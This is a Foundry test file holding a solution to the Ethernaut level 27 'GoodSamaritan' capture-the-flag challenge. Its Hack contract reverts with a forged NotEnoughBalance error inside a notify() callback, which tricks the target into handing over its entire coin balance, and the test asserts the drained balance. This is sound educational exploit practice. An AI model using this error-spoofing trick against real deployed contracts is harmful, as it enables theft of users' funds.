// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_27/GoodSamaritan.sol";

contract GoodSamaritanTest is Test {
    GoodSamaritan goodSamaritan;
    Hack hackContract;
    address alice;

    function setUp() public {
        goodSamaritan = new GoodSamaritan();
        hackContract = new Hack();
    }

    function testAttack() public {
        goodSamaritan.wallet().owner();

        vm.prank(address(hackContract));
        goodSamaritan.requestDonation();

        assertEq(goodSamaritan.coin().balances(address(goodSamaritan)), 0);
    }
}

contract Hack {
    bool called = false;

    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
